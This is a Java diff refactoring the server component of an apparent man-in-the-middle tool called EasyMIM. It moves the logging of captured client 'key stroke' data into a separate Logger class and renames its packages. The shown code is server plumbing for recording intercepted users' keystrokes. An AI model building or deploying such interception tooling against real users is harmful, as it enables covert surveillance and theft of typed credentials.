@@ -29,12 +29,14 @@ import org.eclipse.jetty.server.handler.AbstractHandler;
 import org.eclipse.jetty.server.handler.ContextHandler;
 import org.eclipse.jetty.servlet.ServletContextHandler;
 import org.eclipse.jetty.servlet.ServletHolder;
+import org.eclipse.jetty.util.Jetty;
 
 import sun.org.mozilla.javascript.internal.json.JsonParser;
 
-import Models.ClientInfo;
-import Models.EasyMIMConfig;
-import Models.LogElement;
+import DataStructures.ClientInfo;
+import DataStructures.EasyMIMConfig;
+import DataStructures.LogElement;
+import Logger.Logger;
 
 import com.google.gson.Gson;
 import com.sun.xml.internal.bind.v2.schemagen.xmlschema.List;
@@ -45,7 +47,7 @@ public class EasyMIMServer {
 	public ServletContextHandler context;
 	public WebsiteProcessor wp;
 	public EasyMIMConfig config;
-	public Object lock = new Object();
+	public Logger logger;
 	
 	class EasyMIMServlet extends HttpServlet
 	{
@@ -57,39 +59,13 @@ public class EasyMIMServer {
 		    		sessions.put(request.getRemoteAddr(),new ClientInfo());
 		    	}
 		    	if(request.getRequestURI().contains("log")){
-		    		synchronized(lock){
-			    		Gson gson = new Gson();
-			    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
-			    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
-			    		//log ket stroke data
-			    		//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
-			    		try {
-			    			 
-			    			String content = new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")";
-			     
-			    			File file = new File(config.logSavePath);
-			     
-			    			// if file doesnt exists, then create it
-			    			if (!file.exists()) {
-			    				file.createNewFile();
-			    			}
-			     
-			    			FileWriter fw = new FileWriter(file.getAbsoluteFile(),true);
-			    			BufferedWriter bw = new BufferedWriter(fw);
-			    			bw.append(content);
-			    			bw.close();
-			     
-			     
-			    		} catch (IOException e) {
-			    			e.printStackTrace();
-			    		}
-			    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")");
-		    		}
+		    		logger.logRequest(config.logSavePath, request);
 		    		return;
 		    	}
 		    	ClientInfo ci = sessions.get(request.getRemoteAddr());
 				response.setStatus(HttpServletResponse.SC_OK);
 				wp.processRequest(request, response,ci);
+				System.out.println(this.getServletContext());
 	    	}catch(Exception e){
 	    		
 	    	}
@@ -98,13 +74,6 @@ public class EasyMIMServer {
 	    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
 	    {
 	    	doGet(request,response);
-	    }
-	    public Map<String,String> convertToRightMap(Map<String,String[]> data){
-	    	HashMap<String,String> out = new HashMap<String,String>();
-	    	for(String key:data.keySet()){
-	    		out.put(key, data.get(key)[0]);
-	    	}
-	    	return out;
 	    }
 	}
 	private void setUpServer(){
@@ -120,6 +89,7 @@ public class EasyMIMServer {
 	public EasyMIMServer(EasyMIMConfig config){
 		this.config = config;
 		wp = new WebsiteProcessor(config);
+		logger = new Logger();
 		this.setUpServer();
 	}
 	public void startServer() throws Exception{
